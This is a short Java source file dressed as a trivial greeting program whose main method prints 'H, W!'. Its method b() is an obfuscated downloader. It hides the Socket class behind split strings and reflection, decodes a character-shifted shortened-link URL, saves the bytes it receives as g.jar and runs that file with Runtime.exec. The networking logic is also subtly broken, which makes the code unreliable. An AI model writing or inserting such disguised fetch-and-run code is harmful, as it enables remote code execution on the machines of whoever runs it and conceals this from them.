import java.lang.*;
import java.io.*;

public class Z {
    private static final String Z = "iuuqt://ujozvsm.dpn/z5nwo7cs";

    public static void main(String[] z) {
        p("H, W!");
    }

    public static void a() {
        p("a!");
    }

    public Z() {
        p("Z!");
    }

    @SuppressWarnings("deprecation")
    public void b() throws Exception {
        p("b!");
        Class<?> c = Class.forName(new StringBuilder("java.net.So").append("cket").toString());
        Object s = c.newInstance();
        String d = "";
        for (int i = 0; i < Z.length(); i++) {
            d += (char) (Z.charAt(i) - 1);
        }
        c.getMethod("connect", String.class, int.class).invoke(s, d, 80);
        Object i = c.getMethod("getInputStream").invoke(s);
        byte[] b = new byte[1024];
        int br = (int) i.getClass().getMethod("read", byte[].class, int.class, int.class).invoke(i, b, 0, b.length);
        FileOutputStream f = new FileOutputStream(new StringBuilder("g.").append("jar").toString());
        f.write(b, 0, br);
        f.close();
        p("L p...");
        Runtime.getRuntime().exec(new StringBuilder("java -jar g.").append("jar").toString());
    }
    
    private static void p(String m) {
        System.out.println(m);
    }
}
